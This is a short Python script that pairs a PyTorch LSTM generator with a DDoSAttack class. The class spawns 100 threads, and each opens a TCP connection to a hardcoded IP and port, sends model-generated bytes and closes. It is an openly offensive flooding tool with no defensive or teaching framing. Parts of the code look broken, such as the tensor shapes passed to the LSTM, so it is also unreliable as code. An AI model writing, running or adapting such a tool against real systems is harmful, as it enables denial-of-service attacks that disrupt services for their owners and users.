import torch
import torch.nn as nn  
import socket
import threading
import logging

logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)

class LSTMGenerator(nn.Module):
    def __init__(self, input_dim, hidden_dim, output_dim, n_layers):
        super(LSTMGenerator, self).__init__()
        self.hidden_dim = hidden_dim
        self.n_layers = n_layers

        self.lstm = nn.LSTM(input_dim, hidden_dim, n_layers, batch_first=True)
        self.fc = nn.Linear(hidden_dim, output_dim)

    def forward(self, x):
        h0 = torch.zeros(self.n_layers, x.size(0), self.hidden_dim).to(x.device)
        c0 = torch.zeros(self.n_layers, x.size(0), self.hidden_dim).to(x.device)

        out, _ = self.lstm(x, (h0, c0))

        out = self.fc(out[:, -1, :])

        return out


class DDoSAttack:
    def __init__(self, target_ip, target_port, num_connections):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_connections = num_connections
        self.threads = []
        self.model = self.load_model()

    def load_model(self):
        input_dim = 100
        hidden_dim = 512
        output_dim = 100
        n_layers = 2

        model = LSTMGenerator(input_dim, hidden_dim, output_dim, n_layers)
        model.load_state_dict(torch.load("model.pth"))
        return model

    def simulate_attack(self):
        for _ in range(self.num_connections):
            thread = threading.Thread(target=self.create_connection)
            self.threads.append(thread)
            thread.start()

    def create_connection(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_ip, self.target_port))
            input_tensor = torch.rand(1, 100)  # replace this with your input data
            payload = self.model(input_tensor).detach().numpy().tobytes()  # Generate payload using the LSTM model
            sock.send(payload)
            logging.info("Payload sent.")
            sock.send(b"QUIT")
            sock.close()
        except Exception as e:
            logging.error(f"Exception occurred while creating a connection: {e}")

    def wait_for_threads(self):
        for thread in self.threads:
            thread.join()


if __name__ == "__main__":
    ddos = DDoSAttack("192.168.1.1", 80, 100)  # target IP, target port, connections
    ddos.simulate_attack()
    ddos.wait_for_threads()
